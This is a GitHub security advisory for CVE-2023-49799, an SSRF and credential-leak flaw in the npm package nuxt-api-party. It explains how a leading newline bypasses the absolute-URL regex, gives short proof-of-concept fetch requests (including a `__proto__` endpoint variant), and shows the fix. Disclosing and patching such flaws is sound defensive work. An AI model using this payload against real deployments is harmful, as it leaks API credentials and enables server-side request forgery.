# [H] SSRF & Credentials Leak 

## Summary
Severity: High
Advisory: GHSA-3wfp-253j-5jxv
CVE: CVE-2023-49799
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2023-12-12
Source: https://github.com/advisories/GHSA-3wfp-253j-5jxv
Type: github-advisory

## Affected
- npm: `nuxt-api-party` — affected >=0 <0.22.0

## Details
### Summary
`nuxt-api-party` allows developers to proxy requests to an API without exposing credentials to the client. [A previous vulnerability](https://huntr.dev/bounties/4c57a3f6-0d0e-4431-9494-4a1e7b062fbf/) allowed an attacker to change the baseURL of the request, potentially leading to credentials being leaked or SSRF. 

This vulnerability is similar, and was caused by a recent change to the detection of absolute URLs, which is no longer sufficient to prevent SSRF. 

### Details
`nuxt-api-party` attempts to check if the user has passed an absolute URL to prevent the aforementioned attack. This has been recently changed to [use a regular expression](https://github.com/johannschopplich/nuxt-api-party/blob/777462e1e3af1d9f8938aa33f230cd8cb6e0cc9a/src/runtime/server/handler.ts#L31) `^https?://`.

This regular expression can be bypassed by an absolute URL with leading whitespace. For example `\nhttps://whatever.com` has a leading newline. 

According to the fetch specification, before a fetch is made the URL is normalized. "To normalize a [byte sequence](https://infra.spec.whatwg.org/#byte-sequence) potentialValue, remove any leading and trailing [HTTP whitespace bytes](https://fetch.spec.whatwg.org/#http-whitespace-byte) from potentialValue." ([source](https://fetch.spec.whatwg.org/))

This means the final request will be normalized to `https://whatever.com`. We have bypassed the check and `nuxt-api-party` will send a request outside of the whitelist. 

This could allow us to leak credentials or perform SSRF.

### PoC
POC using Node.

```js
await fetch("/api/__api_party/MyEndpoint", {
    method: "POST",
    body: JSON.stringify({ path: "\nhttps://google.com" }),
    headers: { "Content-Type": "application/json" }
})
```

We can use `__proto__` as a substitute for the endpoint if it is not known. This will not leak any credentials as all attributes on `endpoint` will be undefined.
```js
await fetch("/api/__api_party/__proto__", {
    method: "POST",
    body: JSON.stringify({ path: "\nhttps://google.com" }),
    headers: { "Content-Type": "application/json" }
})
```

### Impact
Leak of sensitive API credentials. SSRF.


### Fix
Revert to the previous method of detecting absolute URLs.
```js
  if (new URL(path, 'http://localhost').origin !== 'http://localhost') {
      // ...
  }
```

## References
- https://github.com/johannschopplich/nuxt-api-party/security/advisories/GHSA-3wfp-253j-5jxv
- https://nvd.nist.gov/vuln/detail/CVE-2023-49799
- https://github.com/johannschopplich/nuxt-api-party/commit/72762a200fc19d997a0f84bce578c28698dc5270
- https://fetch.spec.whatwg.org
- https://fetch.spec.whatwg.org/#http-whitespace-byte
- https://github.com/johannschopplich/nuxt-api-party
- https://github.com/johannschopplich/nuxt-api-party/blob/777462e1e3af1d9f8938aa33f230cd8cb6e0cc9a/src/runtime/server/handler.ts#L31
- https://infra.spec.whatwg.org/#byte-sequence
